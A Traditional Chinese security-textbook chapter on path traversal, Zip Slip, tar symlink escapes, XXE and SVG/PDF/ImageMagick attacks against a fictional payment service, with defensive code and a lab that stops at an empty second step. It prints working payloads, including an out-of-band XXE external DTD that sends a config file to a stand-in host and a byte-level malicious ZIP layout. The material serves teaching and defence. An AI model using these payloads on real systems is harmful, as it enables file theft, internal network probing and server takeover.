# 第 9 章：檔案處理、路徑穿越與複合解析器攻擊面

只要系統支援商戶上傳檔案、批次匯入對帳單或匯出 PDF 發票，後端就得面對一整串的檔案處理管線：接收 `multipart/form-data`、用 `path.join()` 拼出儲存路徑、呼叫解壓縮套件拆開 `.zip` 或 `.tar`，或是把商戶傳來的 XML 發票與 SVG 商標交給 `libxml2`、ImageMagick 或 Headless Chromium 轉成 PDF。

這些功能之所以經常成為整套系統最脆弱的破口，通常不是因為某個單一函式寫錯，而是因為**同一份位元組串流會接力穿過好幾個截然不同的解析器與狀態機**。在本章中，我們會鎖定 **NexusPay** 的三條核心檔案管線——解壓縮至 `/var/nexuspay/uploads/<merchant_id>/` 的對帳單 ZIP 匯入、電子發票 XML 轉 PDF 產生器，以及商戶 Logo 縮圖管線——拆解攻擊者如何利用跨層解析落差，一路從路徑穿越打到任意檔案讀取與遠端程式碼執行（RCE）。

---

## 從你已知的出發

為什麼解壓縮程式明明已經過濾掉所有包含 `..` 與 `/` 開頭的檔名，上傳的 `.tar` 歸檔還是能把惡意腳本寫進 `/app/config/webhook.json` 甚至 `/etc/cron.d/`？為什麼上傳圖片時明明檢查了 `.png` 副檔名，後端做縮圖時卻還是被執行了系統指令？

因為**前一層用字串看的「安全檔名」，到了下一層作業系統 VFS（Virtual File System）或複合格式解析器眼裡，代表的根本不是同一個東西**。當檔案流依序經過路由字串檢查、Node.js `path` 模組、ZIP/TAR 歸檔結構、Linux 核心的 `dentry` 與 `inode`/symlink 解析、XML DTD 展開器，再到圖片與 PDF 渲染引擎的外部委派（Delegate）管線時，只要前後兩層對「根目錄邊界」、「軟連結跟隨」或「檔案魔術位元組（Magic Bytes）」的認知差了一步，前面的防護就會在後面被拆光。守住檔案管線的關鍵，是在每次跨入底層檔案系統與解析器時親自鎖死實體路徑與解析器能力。

---

## 機制與推導

### 攻擊者目標與實質影響

檔案解析器與 XML/多媒體引擎之所以受攻擊者青睞，是因為它們直接摸到底層檔案系統與內部網路：

第一個核心目標是**任意檔案覆寫與遠端程式碼執行**（RCE）。攻擊者只要利用路徑穿越或 Zip Slip 跳出上傳目錄，就能覆寫系統的排程檔（Cron）、服務設定檔（如 `webhook.json`）、SSH 金鑰或應用程式熱載入的程式碼模組，直接拿下伺服器控制權。

第二個目標是**竊取本機機密與探測內網**（SSRF）。透過 XML 外部實體（XXE）或 Headless 瀏覽器渲染 PDF 時的 `<iframe src="file://...">`，攻擊者可以偷偷讀走伺服器上的環境變數與私鑰，或是逼迫後端容器幫自己掃描內網服務。

一旦透過檔案讀取拿到了內部微服務的連線憑證或簽章金鑰，這塊破口就能立刻串接第 6 章的跨租戶越權讀寫，甚至成為滲透整個 Kubernetes 叢集內網的跳板。

### 1. 路徑穿越（Path Traversal）：正規化順序與前綴比對破口

在 Linux 核心的 VFS 路徑查找流程中，作業系統會順著路徑一段一段解析目錄項（`dentry`）與 `inode`：遇到 `.` 就留在原地，遇到 `..` 就退回上一層父目錄的 `inode`（如果已經退到根目錄 `/` 或 `chroot` 邊界，再退也還是停在根目錄）。

當應用程式在「自己做字串檢查」與「交給作業系統開檔」之間出現順序或語意落差時，就會爆出以下四種最常見的路徑穿越破口。

#### 先檢查、後解碼與單次替換陷阱

很多網關或後端中介層會在路由入口先檢查字串裡有沒有 `../`，確定沒有才放行。但如果後面的業務程式碼又自己呼叫了一次 URL 解碼或字串替換，防線當場就破了：
- **編碼繞過**：過濾器在解碼前只擋字面上的 `../`，攻擊者只要送出 `%2e%2e%2f` 或雙重 URL 編碼 `%252e%252e%252f`（甚至在舊式解碼器上送非標準的 UTF-8 Overlong Encoding 如 `%c0%ae`），就能平安穿過檢查，在後面的解碼步驟還原出真正的 `../`。
- **單次替換還原**：有的開發者會寫 `filename.replace("../", "")` 來「洗掉」危險字元。由於只替換了一次，攻擊者只要傳入 `....//`，中間的 `../` 被拔掉之後，左右剩下的字元剛好又拼回一組全新的 `../`。
- **跨平台斜線差異**：在 Windows 或部分相容層環境中，正斜線 `/` 與反斜線 `\` 都能當作目錄分隔符；如果過濾器只擋 `../`，傳入 `..\` 就能長驅直入。

#### `path.join()` 與 `path.resolve()` 的語意誤區

寫 Node.js 的工程師很常以為「只要用了 `path.join(BASE_DIR, userInput)`，路徑就會被安全地鎖在 `BASE_DIR` 裡面」。

這完全是誤會。`path.join()` 只負責把字串接起來並消掉多餘的 `.` 與 `..`，它**完全不會幫你檢查最後算出來的路徑有沒有退到 `BASE_DIR` 外面**。而另一個常用函式 `path.resolve(BASE_DIR, userInput)` 更危險：只要攻擊者傳進來的 `userInput` 是以斜線 `/` 開頭（例如 `/app/config/webhook.json`），`path.resolve()` 就會把它當成絕對路徑，直接把左邊的 `BASE_DIR` 整個丟掉！

#### 前綴比對繞過（`/uploads` vs `/uploads-secret`）

知道 `path.resolve()` 會往外跑之後，很多工程師會加上一行 `startsWith()` 檢查，寫出這段看似嚴謹、實則有洞的程式碼：

```typescript
// 漏洞示範：前綴比對漏了結尾的路徑分隔符！
const UPLOAD_ROOT = "/var/nexuspay/uploads";
const target = path.resolve(UPLOAD_ROOT, userFile);

if (!target.startsWith(UPLOAD_ROOT)) {
  throw new Error("Path traversal detected");
}
```

看看當攻擊者傳入 `userFile = "../uploads-secret/private.key"` 時會發生什麼事：`path.resolve()` 算出來的結果是 `"/var/nexuspay/uploads-secret/private.key"`。請問這個字串有沒有以 `"/var/nexuspay/uploads"` 開頭？**有！** 因為檢查時漏了結尾的斜線 `/`，`startsWith` 高高興興地回傳了 `true`，攻擊者就這樣大搖大擺地跨進了隔壁的同級機密目錄。

#### 軟連結、硬連結與 Null Byte 截斷

就算你把字串層級的前綴檢查寫得滴水不漏（強制比對 `"/var/nexuspay/uploads/"`），只要上傳目錄裡允許建立符號連結（Symlink），作業系統在真正執行 `open()` 開檔時，還是會順著連結指過去的目標路徑跳出沙箱目錄；同樣地，如果權限允許對同一個磁碟分割區的其他檔案建立硬連結（Hard Link），新的目錄項就會直接指到同一個底層 `inode`。

至於早期 C/PHP 常見的 Null Byte 截斷（例如傳入 `../../etc/passwd%00.png` 騙過副檔名檢查，讓底層以 `\0` 結尾的 C 字串函式提早截斷），現代的 Node.js `fs` 與 Python 3 已經會在進入系統呼叫前攔截任何包含 `\x00` 的路徑並直接報錯。不過一旦你的 Node.js 服務透過 FFI 把字串指針傳給底層自寫的 C/Rust 模組（見第 25 章），檢查內嵌 `\x00` 依然是不可省略的保命符。

---

### 2. 歸檔解析器逃逸：Zip Slip 與 Tar Symlink 兩階段攻擊

如果說單一檔案上傳的路徑穿越還容易防，那麼**解壓縮歸檔**（`.zip` 或 `.tar`）就是路徑穿越的超級放大器。因為對外層上傳介面來說，商戶傳上來的 `reconcile.zip` 只是一個檔名合法的普通檔案；但拆開它的肚子，裡面卻可以裝著好幾百個帶有任意相對路徑的內部條目（Entry）。

#### Zip Slip 是怎麼發生的

在 ZIP 的二進位格式裡，每個檔案條目的「檔名欄位」其實就是一段普通的位元組字串，規範完全沒禁止你在裡面塞 `../../../../`。當後端使用沒有預設攔截跨目錄路徑的解壓縮套件、或是自己寫串流迴圈把 `entry.fileName` 丟進 `path.join(destDir, entry.fileName)` 並寫入磁碟時，只要 Node.js 行程對目標目錄有寫入權限，就能一舉覆寫掉基準目錄外的設定檔、SSH `authorized_keys` 或程式碼檔案。這就是著名的 **Zip Slip** 漏洞。

#### Tar Symlink 的兩階段接力逃逸

那如果我們在解壓縮迴圈裡，把所有包含 `..` 或以 `/` 開頭的檔名全部擋掉，是不是就安全了？對 `.tar` 歸檔來說，**還差得遠**！

因為 TAR 格式除了一般檔案（Typeflag `'0'`，`REGTYPE`）之外，原生就支援打包**符號連結**（Typeflag `'2'`，`SYMTYPE`）與**硬連結**（Typeflag `'1'`，`LNKTYPE`）。攻擊者根本不需要在檔名裡寫任何一個 `..`，只要在 `.tar` 裡面放兩個條目就能完成兩階段越獄：

```text
Archive Entry #1 (先在目錄內放一個看似乖巧的軟連結):
  name:     "safe_link"
  typeflag: '2' (SYMTYPE)
  linkname: "/app/config"          <-- 指向沙箱外的目錄，但條目檔名本身完全沒有 ".."

Archive Entry #2 (接著順著剛剛建好的軟連結寫檔):
  name:     "safe_link/webhook.json"
  typeflag: '0' (REGTYPE)
  data:     {"endpoint": "http://attacker.invalid/hook"}
```

你看這個過程有多陰險：解壓縮器檢查第一個條目的檔名 `safe_link`，既沒有 `..` 也沒有開頭的 `/`，完全合法，於是乖乖在 `/var/nexuspay/uploads/m_1042/safe_link` 建了一個指向 `/app/config` 的軟連結。接著處理第二個條目 `safe_link/webhook.json`，做字串正規化與前綴檢查時，它看起來也百分之百落在 `/var/nexuspay/uploads/m_1042/` 裡面；但當程式呼叫作業系統 `open()` 寫入檔案的那一瞬間，Linux 核心 VFS 順著 `safe_link` 指過去的 `inode` 一走，資料就直接寫進 `/app/config/webhook.json` 裡了！

---

### 3. XXE（XML External Entity）：DTD 狀態機與盲注外帶

看完了歸檔解壓縮，我們來看 NexusPay 的第二條管線：接收商戶上傳的 XML 格式電子發票。

根據 W3C 的 XML 1.0 規範，XML 文件可以在開頭加上**文件型別定義**（DTD，Document Type Definition），用來宣告內部實體、**外部一般實體**（General Entity，在內文用 `&name;` 引用）以及專門在 DTD 裡面使用的**參數實體**（Parameter Entity，在 DTD 內用 `%name;` 引用）。如果後端的 XML 解析器（如 `libxml2`）打開了外部實體展開功能，當它讀到 `SYSTEM "file:///..."` 或 `SYSTEM "http://..."` 時，就會自動幫你去讀本機檔案或發起網路請求（在某些掛了特殊 Wrapper 的 PHP 環境裡，甚至能呼叫 `php://filter` 或 `expect://`）。

#### 傳統有回顯（In-band）XXE

如果 NexusPay 的發票匯入 API 會在回應裡把解析出來的商戶名稱印出來（例如回傳「成功匯入商戶 XXX 的發票」），攻擊者只要宣告一個指向本機檔案的外部一般實體 `&xxe;`，放在 `<merchantName>` 標籤裡就能直接拿到檔案內容：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<invoice>
  <merchantName>&xxe;</merchantName>
</invoice>
```

#### 盲注外帶（Out-of-Band / Blind XXE）為什麼非得拆兩階段？

但在真實生產環境裡，絕大多數批次匯入 API（包含 NexusPay 的 `/v1/invoices/import`）只會冷冰冰地回你一個 `202 Accepted` 或 `{"ok": true}`，半個 XML 欄位都不會回顯。這時如果目標容器可以連外，攻擊者就會改走 **OOB（Out-of-Band）盲注外帶**——把偷讀到的檔案內容，塞進發往攻擊者伺服器的 HTTP URL 查詢參數裡帶出來。

這時候很多初學者會問：「既然要外帶，為什麼不直接在請求的 XML 內部 DTD 裡寫兩行宣告，把 `%file;` 塞進網址裡就好？」像下面這樣寫，為什麼所有標準 XML 解析器都會直接報語法錯誤？

```xml
<!-- 錯誤寫法：標準 XML 解析器絕對不會過！ -->
<!DOCTYPE invoice [
  <!ENTITY % file SYSTEM "file:///app/config/webhook.json">
  <!ENTITY % send SYSTEM "http://10.0.0.5:8000/?d=%file;">
  %send;
]>
```

這卡在 XML 1.0 規範的兩條死規矩上：
1. 第一，`SYSTEM` 後面雙引號括起來的網址叫做 `SystemLiteral`，XML 解析器**不會在 `SystemLiteral` 裡面直接幫你展開 `%file;` 參數實體**。想把 `%file;` 的內容塞進網址裡，你必須用「另一個外層參數實體的文字值（`EntityValue`）」去動態拼出整條 `<!ENTITY % send SYSTEM '...'>` 宣告字串。
2. 第二，也是最關鍵的一條：**XML 1.0 規範 §2.8（Well-Formedness Constraint: PEs in Internal Subset）明文規定，在文件內部的 DTD 子集（Internal Subset）裡，參數實體引用 `%pe;` 只能獨立出現在宣告與宣告之間，絕對不准出現在另一條標記宣告（Markup Declaration，`<!ENTITY ...>`）的內部！**

為了同時滿足這兩條規範限制，實戰中的 Blind XXE 才會發展出經典的「**兩階段外部 DTD 載入**」手法：先在請求的內部 DTD 頂層合法地寫一行 `%dtd;`，把攻擊者伺服器上的外部 `.dtd` 檔案拉進來；因為**外部 DTD 子集（External Subset）完全不受 §2.8 的限制**，允許在標記宣告裡面展開參數實體，攻擊者就能在外部 `.dtd` 裡面用 `%eval;` 動態生出 `%exfil;`，順利把檔案內容當成網址參數送出去！

#### 連外被封鎖時的 Error-Based XXE

那如果目標容器被防火牆（Egress Firewall）鎖死，根本連不上外網拿 `oob.dtd` 怎麼辦？

只要伺服器會把 XML 解析失敗的錯誤訊息吐回前端，攻擊者還可以改借伺服器本機原本就有的 `.dtd` 檔案（例如許多 Linux 容器裡預設裝有 `/usr/share/yelp/dtd/docbookx.dtd` 或 `/usr/share/xml/fontconfig/fonts.dtd`）。利用 **XML 1.0 §4.2** 的「**同名實體重複宣告時，永遠以第一個出現的宣告為準**」（First Declaration Wins）規則，攻擊者可以先在內部 DTD 子集裡搶先定義一個本地 DTD 待會會用到的參數實體，然後再引入那份本地 DTD；當本地 DTD 在外部子集裡展開這個被掉包的實體、並試圖打開像 `file:///nonexistent/%secret;` 這樣不存在的路徑時，解析器噴出的「找不到檔案：`/nonexistent/{機密內容}`」錯誤訊息，就把檔案內容直接洩漏給客戶端了。

---

### 4. Worked Example：惡意 ZIP 二進位結構與 OOB XXE 狀態推導

現在我們把前面講的 Zip Slip 與兩階段 OOB XXE 放進 NexusPay 的真實環境參數裡，一格一格算出位元組偏移與解析器狀態變化：

```text
=== Worked Example：NexusPay 對帳單 Zip Slip 位元組佈局與發票 OOB XXE 推導 ===

-------------------------------------------------------------------------
[情境 A] NexusPay 商戶對帳單 Zip Slip 歸檔位元組實算
-------------------------------------------------------------------------
- 商戶 m_1042 解壓縮基準目錄：/var/nexuspay/uploads/m_1042（距離根目錄 / 共 4 層）
- 攻擊目標：向上退 4 層覆寫 /app/config/webhook.json
- 構造條目檔名："../../../../app/config/webhook.json"
  長度實算：4 組 "../" (4 × 3 = 12B) + "app/" (4B) + "config/" (7B) + "webhook.json" (12B)
          = 35 bytes (小端序 uint16 = 0x23 0x00)
- 構造寫入負載（Store 不壓縮模式 0x0000）：
  '{"secret":"pwned","endpoint":"http://10.0.0.5/hook"}'
  長度實算：'{"secret":' (10B) + '"pwned",' (8B) + '"endpoint":' (11B) + '"http://10.0.0.5/hook"}' (23B)
          = 52 bytes (小端序 uint32 = 0x34 0x00 0x00 0x00)

[ZIP 檔案完整位元組偏移佈局（總長 220 bytes）]
[Offset 0x0000 (0)] Local File Header (固定 30 bytes)
  0000: 50 4b 03 04        ; Signature: PK\x03\x04
  0004: 14 00              ; Version needed to extract (2.0)
  0006: 00 00              ; General purpose bit flag
  0008: 00 00              ; Compression method: 0 (Stored)
  000a: 00 00 00 00        ; Last mod file time & date
  000e: 7a 91 4c 2b        ; CRC-32 (範例校驗值)
  0012: 34 00 00 00        ; Compressed size = 52 bytes (0x34)
  0016: 34 00 00 00        ; Uncompressed size = 52 bytes (0x34)
  001a: 23 00              ; File name length = 35 bytes (0x23)
  001c: 00 00              ; Extra field length = 0 bytes
[Offset 0x001e (30)] File Name (35 bytes)
  "../../../../app/config/webhook.json"
[Offset 0x0041 (65)] File Data (52 bytes)
  {"secret":"pwned","endpoint":"http://10.0.0.5/hook"}

[Offset 0x0075 (117)] Central Directory File Header (固定 46 bytes)
  0075: 50 4b 01 02        ; Signature: PK\x01\x02
  0079: 1e 03              ; Version made by (UNIX, 3.0)
  007b: 14 00              ; Version needed (2.0)
  007d: 00 00 00 00        ; Flags + Compression (0)
  0081: 00 00 00 00        ; Mod time & date
  0085: 7a 91 4c 2b        ; CRC-32
  0089: 34 00 00 00        ; Compressed size = 52 bytes (0x34)
  008d: 34 00 00 00        ; Uncompressed size = 52 bytes (0x34)
  0091: 23 00              ; File name length = 35 bytes (0x23)
  0093: 00 00 00 00 00 00  ; Extra len (0) + Comment len (0) + Disk start (0)
  0099: 00 00              ; Internal file attributes
  009b: 00 00 a4 81        ; External file attributes (0100644 << 16)
  009f: 00 00 00 00        ; Relative offset of Local Header = 0x00000000
[Offset 0x00a3 (163)] Central Directory File Name (35 bytes)
  "../../../../app/config/webhook.json"

[Offset 0x00c6 (198)] End of Central Directory (固定 22 bytes, 198 + 22 = 220 bytes)
  00c6: 50 4b 05 06        ; Signature: PK\x05\x06
  00ca: 00 00 00 00        ; Disk numbers
  00ce: 01 00 01 00        ; Entries on disk (1), Total entries (1)
  00d2: 51 00 00 00        ; Size of Central Directory = 46 + 35 = 81 bytes (0x51)
  00d6: 75 00 00 00        ; Offset of start of Central Directory = 117 bytes (0x75)
  00da: 00 00              ; Comment length = 0

[path.join('/var/nexuspay/uploads/m_1042', entry.fileName) 詞法歸約軌跡]
  起始路徑：/var/nexuspay/uploads/m_1042
  消解 ../ #1 → /var/nexuspay/uploads
  消解 ../ #2 → /var/nexuspay
  消解 ../ #3 → /var
  消解 ../ #4 → /
  拼接尾段   → /app/config/webhook.json (逃出上傳目錄，直接覆寫系統 Webhook 設定！)

-------------------------------------------------------------------------
[情境 B] NexusPay 發票匯入 (/v1/invoices/import) OOB XXE 兩階段外帶狀態機
-------------------------------------------------------------------------
1. 攻擊者送出的發票 XML (內部 DTD 子集僅在頂層呼叫 %dtd;，完全符合 XML 1.0 §2.8):
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE invoice [
     <!ENTITY % dtd SYSTEM "http://10.0.0.5:8000/oob.dtd">
     %dtd;
   ]>
   <invoice><id>INV-2026-0091</id></invoice>

2. 攻擊者主機 (10.0.0.5:8000) 回傳的外部 DTD (oob.dtd):
   <!ENTITY % file SYSTEM "file:///app/config/webhook.json">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.0.0.5:8000/collect?data=%file;'>">
   %eval;
   %exfil;

3. 解析器展開順序：
   Step 1: 解析器遇到頂層 %dtd; → 發起 HTTP GET http://10.0.0.5:8000/oob.dtd 載入外部子集。
   Step 2: 進入外部子集，註冊 %file → 讀取本機 /app/config/webhook.json (52 bytes)。
   Step 3: 展開 %eval → 在外部子集內將 &#x25; 解碼為 %，並把 %file 內容嵌進網址，動態註冊出 %exfil。
   Step 4: 展開 %exfil → 解析器向 http://10.0.0.5:8000/collect?data=... 發起請求，機密入袋！
```

要注意的是，在情境 B 的 Step 4 裡，如果偷讀的檔案內容剛好含有換行、雙引號、`#` 或 `&` 等特殊字元，拼進 URL 或 XML 實體宣告時可能會因為破壞語法而報錯中斷。在支援 `php://filter/convert.base64-encode/resource=...` 的 PHP 環境裡，攻擊者會先把檔案轉成乾淨的 Base64 字串再外帶；而在一般 Node.js / Java / C++ 解析器環境裡，如果目標檔案是多行文字，攻擊者就會改走前面提過的 Error-Based XXE 或是利用支援多行傳輸的協定來把資料帶出來。

---

### 5. SVG、PDF 與影像處理庫的複合解析攻擊面

現代後端的檔案管線很少只停在純文字與壓縮檔。當 NexusPay 開放商戶上傳 SVG 格式的品牌 Logo，或是用 Headless Chromium 把 HTML 發票轉成 PDF 對帳單時，攻擊面就瞬間延伸到了瀏覽器渲染引擎與底層 C/C++ 多媒體函式庫。

#### SVG 的雙重身分：看似圖片，實則 XML + 執行腳本

很多工程師把 `.svg` 當成跟 `.png`、`.jpg` 一樣的普通圖片，但 SVG（Scalable Vector Graphics）的骨子裡其實是一份**標準的 XML 文件**，這讓它同時帶著三種殺傷力：
- **Stored XSS**：如果後端把商戶上傳的 `.svg` 放在跟主站同源（Same-Origin）的網域下，直接用 `Content-Type: image/svg+xml` 回傳，而且沒有強制加上 `Content-Disposition: attachment` 下載標頭，那麼一旦受害者直接點開這個圖片網址（或透過同源 `<iframe>` / `<object>` 嵌入，而不是放在會禁止腳本執行的 `<img>` 標籤裡），SVG 裡面夾帶的 `<script>fetch(...)</script>` 或 `onload="..."` 就會直接在受害者的同源瀏覽器裡執行起來！
- **XXE**：如果後端用沒關掉外部實體的 XML 解析器去讀 SVG（例如為了檢查圖片寬高或轉成 PNG），SVG 開頭一樣能塞 `<!DOCTYPE svg [ <!ENTITY ...> ]>` 觸發 XXE。
- **SSRF**：SVG 規範允許用 `<image xlink:href="http://169.254.169.254/latest/meta-data/" />` 引用外部圖片。要是後端的 SVG 轉檔器允許載入外部網路資源，在伺服器上幫它轉檔時就會自動幫攻擊者去偷打內網 API。

#### PDF 產生器（Headless Chromium / wkhtmltopdf / WeasyPrint）

NexusPay 為了產生漂亮的每月對帳單，會在後端容器裡跑一個 Headless Chromium，把商戶的交易明細套進 HTML 模板後列印成 PDF。

你想想看，如果商戶名稱或發票備註欄位沒有做 HTML 跳脫（Escape）就直接拼進 HTML 模板裡，會發生什麼事？攻擊者只要把商戶名稱改成 `<iframe src="file:///etc/passwd" width="800" height="600"></iframe>` 或是插入一段 `<script>` 去 `fetch('http://127.0.0.1:8080/internal')` 再寫進 `document.body`。當後端容器裡的 Headless Chromium 打開這份 HTML 準備渲染 PDF 時（特別是用 `file://` 本地路徑載入模板且沒關掉本機檔案存取，或是容器網路能直連內部微服務時），Chromium 就會乖乖把本機的 `/etc/passwd` 或內網 API 回應畫在 PDF 頁面上，最後當成對帳單讓你下載回來！這就是把**伺服器端 XSS 直接轉化成任意檔案讀取與 SSRF**。

#### 影像處理庫的外部委派與像素洪水（ImageMagick / Ghostscript / libvips）

處理商戶上傳的點陣圖時，後端最常踩的坑則是 ImageMagick 這類萬能影像處理庫的**委派機制**（Delegates）與記憶體配置：
- **副檔名與 Magic Bytes 掉包**：就算你的上傳 API 嚴格檢查檔名必須是 `.png` 結尾，只要沒有在 ImageMagick 的 `policy.xml` 裡鎖死允許的解碼格式，也沒在呼叫時強制指定 `png:` 格式前綴，ImageMagick 打開檔案時看的是**檔案開頭的魔術位元組**（Magic Bytes）。攻擊者只要把檔案開頭寫成 `%!PS-Adobe-`（PostScript 格式）或 `<svg`（MVG/SVG 格式），再取名為 `logo.png` 傳上來，ImageMagick 就會自動喚起外部的 Ghostscript 或 SVG 委派程式來處理它——歷史上鼎鼎大名的 ImageTragick（`CVE-2016-3714`）以及多起 Ghostscript `-dSAFER` 沙箱繞過 RCE，全都是這樣打穿的。
- **像素洪水（Pixel Flood）與原生記憶體損毀**：一個壓縮後只有 `50 KB` 的合法 PNG 或 SVG 檔案，可以在檔頭宣告它的圖片尺寸是 `65535 × 65535` 像素。如果解碼器沒設像素上限，傻傻地按每像素 `4 bytes`（RGBA）一次性配置未壓縮緩衝區，單張圖片就會瞬間討要約 `16 GiB` 的記憶體，當場把後端容器 OOM 搞掛；要是底層的 C 語言解碼器（如 `libtiff`、`libwebp`）在算寬高乘積時發生整數溢位，更會直接演變成堆積緩衝區越界寫入（詳見第 22 至 24 章）。

---

## 故障模式與防禦

看穿了多層解析器是怎麼接力出包的，我們在設計檔案處理防線時，就不能只靠外層擋檔名，而必須同時鎖死**真實路徑邊界、解析器危險功能開關，以及執行環境的沙箱隔離**。

| 攻擊面 | 常被繞過的錯誤防禦 | 為什麼擋不住 | 真正能鎖死邊界的工程做法 |
|---|---|---|---|
| **路徑穿越** | `filename.replace("../", "")` 或 `startsWith(ROOT)` | `....//` 替換一次後還原出 `../`；`/uploads` 前綴會放行 `/uploads-secret` | 先用 `realpathSync` 與 `path.resolve` 正規化，強制檢查 `startsWith(ROOT + path.sep)`，並用不跟隨連結的 `lstatSync` 確認路徑上沒有任何 symlink |
| **Zip Slip / Tar** | 直接丟給 `unzip` / `tar`，或只檢查檔名不含 `..` | TAR 格式支援兩階段先建 `SYMTYPE` 軟連結、再寫入目錄外 | 單檔上傳一律改用隨機 UUID 命名；解壓縮時先拒絕所有非一般檔案條目（擋掉 symlink / hardlink），再對每個條目跑完整路徑與祖先目錄 symlink 檢查 |
| **XXE** | 用正規表達式過濾 `<!ENTITY` 或 `SYSTEM` 字串 | 換成 UTF-16 編碼、外部 DTD 或參數實體就繞過去了 | 在 XML 解析器設定裡徹底拒收 `<!DOCTYPE>`、關閉外部 DTD 與實體替換（注意 `libxmljs` 的 `noent` 必須保持 `false`！）；能用 JSON 就別用 XML |
| **SVG / 靜態檔案** | 只檢查 HTTP `Content-Type` 或副檔名 | 瀏覽器同源直接開啟 `.svg` 會執行裡面的 `<script>` | 使用者上傳檔一律丟到獨立的無憑證網域（如 `nexuspay-usercontent.example`），搭配 `Content-Disposition: attachment` 與 `X-Content-Type-Options: nosniff`；SVG 必須用 DOMPurify 清洗或轉成純 PNG |
| **PDF / 影像縮圖** | 拿預設的 ImageMagick 與 Headless Chrome 直接轉檔 | Magic Bytes 自動觸發 Ghostscript 委派；Chrome 直接讀本機 `file://` 與內網 | 鎖死 ImageMagick `policy.xml`（只開 `PNG`/`JPEG`/`WEBP`，全關 `PS`/`EPS`/`PDF`/`MVG`/`URL`）並限制最大寬高與記憶體；Headless Chrome 丟進斷網、無檔案權限的獨立沙箱容器裡渲染 |

### 防禦實作 1：Node.js 零死角路徑與 Symlink 檢查函式

在處理歸檔解壓縮或相對路徑讀寫時，下面這支 `resolveSafePath()` 函式示範了怎麼同時擋下絕對路徑覆蓋、`/uploads-secret` 前綴繞過，以及已經存在於目錄樹裡的符號連結（包含指向不存在檔案的懸空 Dangling Symlink）：

```typescript
import fs from "node:fs";
import path from "node:path";

/**
 * 確認目標路徑嚴格落在 baseDir 內部，且沿途與終點皆無 symlink 跳出沙箱。
 * 注意：解壓縮 TAR/ZIP 時，呼叫此函式前必須先拒絕所有 SYMTYPE / LNKTYPE 連結型條目！
 * 若同一目錄可能被其他併發行程同時改動，則需在支援平台改用 openat(..., O_NOFOLLOW)
 * 或 Linux openat2(..., RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS) 在核心開檔當下強制鎖死。
 */
export function resolveSafePath(baseDir: string, unsafeEntryName: string): string {
  // 1. 先拿到基準目錄本身的真實實體路徑，並確保結尾一定帶有路徑分隔符 "/"
  const realBase = fs.realpathSync(baseDir);
  const baseWithSep = realBase.endsWith(path.sep) ? realBase : realBase + path.sep;

  // 2. 嚴禁傳入絕對路徑（否則 path.resolve 會直接丟掉左邊的 realBase）
  if (path.isAbsolute(unsafeEntryName)) {
    throw new Error(`Rejected absolute entry path: ${unsafeEntryName}`);
  }
  const candidate = path.resolve(realBase, unsafeEntryName);

  // 3. 嚴格比對帶有結尾斜線的前綴，徹底堵死 /uploads vs /uploads-secret
  if (!candidate.startsWith(baseWithSep)) {
    throw new Error(`Path traversal attempt: ${unsafeEntryName}`);
  }

  // 4. 用不跟隨連結的 lstatSync 往上找最深的一層既有祖先目錄，攔截半路上的 symlink
  let existingAncestor = path.dirname(candidate);
  while (true) {
    const st = fs.lstatSync(existingAncestor, { throwIfNoEntry: false });
    if (st !== undefined) {
      if (st.isSymbolicLink()) {
        throw new Error(`Symlink ancestor rejected: ${existingAncestor}`);
      }
      break;
    }
    const nextParent = path.dirname(existingAncestor);
    if (nextParent === existingAncestor) break;
    existingAncestor = nextParent;
  }
  const realAncestor = fs.realpathSync(existingAncestor);
  if (realAncestor !== realBase && !realAncestor.startsWith(baseWithSep)) {
    throw new Error(`Symlink escape detected at ancestor: ${existingAncestor}`);
  }

  // 5. 用 lstatSync 檢查目標路徑本身（千萬別用 existsSync，因為 existsSync 對懸空 symlink 會回傳 false！）
  const targetStat = fs.lstatSync(candidate, { throwIfNoEntry: false });
  if (targetStat !== undefined && targetStat.isSymbolicLink()) {
    throw new Error(`Refusing to overwrite existing symlink (including dangling symlink): ${candidate}`);
  }

  return candidate;
}
```

### 防禦實作 2：千萬別開錯的 XML 解析器開關

在 Node.js 或其他語言綁定底層 `libxml2`（例如 `libxmljs`）時，有一個害慘無數工程師的命名陷阱：**千萬不要傳入 `{ noent: true }`！**

很多人望文生義，以為 `noent: true` 是「No Entities（禁止實體）」的意思。恰恰相反！在 `libxml2` 底層，這個旗標對應的是 `LIBXML_NOENT`，它的官方定義是「**把所有實體引用替換成展開後的內容，讓最終的 DOM 樹裡不再留有 Entity 節點**」——把 `noent` 設成 `true`，反而等於親手幫駭客打開了 XXE 實體展開開關！

真正安全的組態，是確保 `noent` 保持關閉（`false`）、明確啟用禁止網路載入（`nonet: true` / `LIBXML_NONET`），並在解析前直接拒絕任何包含 `<!DOCTYPE` 的請求；如果改用純 JavaScript 寫的解析器（如 `fast-xml-parser`），雖然它預設不會去發網路請求或讀本機檔案，但還是要記得把 `processEntities: false` 關掉（或嚴格限制展開深度與總字數），免得被「十億笑聲」（Billion Laughs / XML Bomb）指數級實體展開塞爆 Node.js 記憶體。

---

## 動手做

- **難度**：進階
- **預估時間**：60 分鐘

現在我們要對本地 NexusPay 檔案服務容器上的兩支漏洞 API 動手實測：
1. `POST /v1/merchants/m_1042/reconcile-zip`：接收 `.zip` 對帳單並解壓縮到 `/var/nexuspay/uploads/m_1042/`，內部只用了沒設防的 `path.join`。
2. `POST /v1/invoices/import`：接收 XML 電子發票並回傳 `202 Accepted`，後端解析器誤開了外部實體展開，且容器網路連得到宿主機的測試埠。

### 步驟 1：構造 Zip Slip 歸檔與架設 OOB XXE 接收端

請寫一支 Python 腳本完成兩項攻擊驗證：
1. 產生一個名叫 `evil_reconcile.zip` 的壓縮檔，裡面塞入名為 `../../../../app/config/webhook.json` 的條目，上傳到 `/v1/merchants/m_1042/reconcile-zip`，驗證能不能跨出 4 層目錄覆寫掉靶機上的 `/app/config/webhook.json`（或本地對應的測試目標路徑）。
2. 在本機 `8000` 埠啟動一個微型 HTTP 伺服器，負責提供 `/oob.dtd` 並監聽 `/collect?data=...`；接著把前面 Worked Example 情境 B 的觸發 XML 送到 `/v1/invoices/import`，觀察終端機有沒有成功收到靶機外帶出來的 `/etc/hostname`（或單行密鑰檔）內容。

### 步驟 2：套用 `resolveSafePath()` 與關閉 DTD 修補漏洞

